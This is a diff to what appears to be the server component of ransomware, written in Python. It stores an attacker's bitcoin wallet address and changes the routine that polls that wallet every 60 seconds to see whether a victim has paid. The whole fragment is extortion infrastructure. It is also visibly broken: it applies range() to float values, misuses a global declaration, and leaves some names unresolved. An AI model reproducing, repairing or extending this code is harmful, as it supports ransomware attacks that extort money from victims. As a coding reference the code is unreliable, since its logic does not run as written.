@@ -34,7 +34,7 @@ class Server:
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
     # initial_balance = cryptowallet.get_balance(WALLET_ADDRESS) #The initial amount of btc's that we have
     bitcoin_needed = 0.0; #Instantiate how much bitcoin is needed
-
+    initial_balance = 1
     def __init__(self, port):
         self._port = port
         # Initialize the socket for connection using TCP protocol
@@ -137,22 +137,17 @@ class Server:
 
 
     #Checks if a user has paid, if somebody has paid then it returns their id, if nobody has it returns null
-    def check_if_user_paid(self, initial_balance):
+    def check_if_user_paid(self, initial_bal):
+        current_balance = self.get_balance(WALLET_ADDRESS)
+        change = current_balance - initial_bal
         
-        current_balance =  self.get_balance(WALLET_ADDRESS)
-
-        # amount_paid = current_balance - initial_balance 
-        
-        # paid  =  amount_paid == 0
-
-        # return paid
-
-        change = current_balance - initial_balance
-
-        if (change == 0):
-            print(bitcoin_needed)
+        print("balance changed by: " + str(change))
+        print("Required change: " + str(bitcoin_needed))
+        print("equal: " + str(change == bitcoin_needed))
+        if (change in range(bitcoin_needed - 0.001, bitcoin_needed + 0.001)):
             return True
         else:
+            global initial_balance
             initial_balance = current_balance
             return False
     
@@ -210,6 +205,7 @@ class Server:
                     #Every  60 seconds check if victim paid, if they did send them a message
                     time.sleep(60)
                     # paid = self.check_if_user_paid()
+                    global initial_balance
                     initial_balance = self.get_balance(WALLET_ADDRESS)
 
 
